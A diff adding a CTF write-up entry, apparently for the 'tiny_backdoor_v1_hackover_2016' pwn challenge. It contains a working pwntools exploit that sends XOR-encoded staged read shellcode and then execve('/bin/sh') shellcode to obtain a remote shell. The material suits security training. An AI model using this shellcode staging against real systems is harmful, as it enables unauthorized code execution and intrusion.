@@ -441,6 +441,57 @@ icon: icon-html
   r.interactive()
   ```
 
+* ### tiny_backdoor_v1_hackover_2016
+
+  能写9字节的shellcode
+
+  先写个read，然后写更长的shellcode
+
+  ```python
+  from pwn import *
+  context(arch = 'amd64', os = 'linux')
+  r = remote('pwn.buuoj.cn',20050)
+  fuck = [
+      0xb3,0x91,0x7f,0xdd,0x62,0x81,0x11,0x6a,
+      0x90,0x8c,0xdb,0xae,0x70,0xa7,0x3f,0xff,
+      0x3a,0xc3,0xe6,0x32,0xff,0x5e,0x46,0x63,
+      0x9a,0x14,0xb7,0x9e,0xad,0xf6,0x09,0xdc,
+      0x33,0x2f,0x35,0xc6,0x6f,0x1a,0x7f,0xff,
+      0x1b,0xc2,0xb5,0xb7,0xb7,0xc2,0xd1,0x75,
+  ]
+  def xor(str):
+  	res = ''
+  	for i in range(len(str)):
+  		res += chr(ord(str[i])^fuck[i])
+  	return res
+  #payload = '\xe6\xd9\xf6\x38\x2a\x02\xfd\x3a\xc3'
+  shellasm = '''
+  pop rbp
+  pop rax
+  pop rdi
+  mov dl,0xff
+  syscall
+  jmp rsi
+  '''
+  shellcode = asm(shellasm)
+  payload = xor(shellcode)
+  log.info(len(payload))
+  r.send(payload)
+  
+  shellasm = '''
+  mov rax,59
+  mov rdi,0x600170
+  xor rsi,rsi
+  xor rdx,rdx
+  syscall
+  '''
+  shellcode = '\x90'*0x1e+asm(shellasm)
+  payload = shellcode.ljust(0x3a,'a')+'/bin/sh\x00'
+  log.info(len(payload))
+  r.send(payload)
+  r.interactive()
+  ```
+
   
 
 
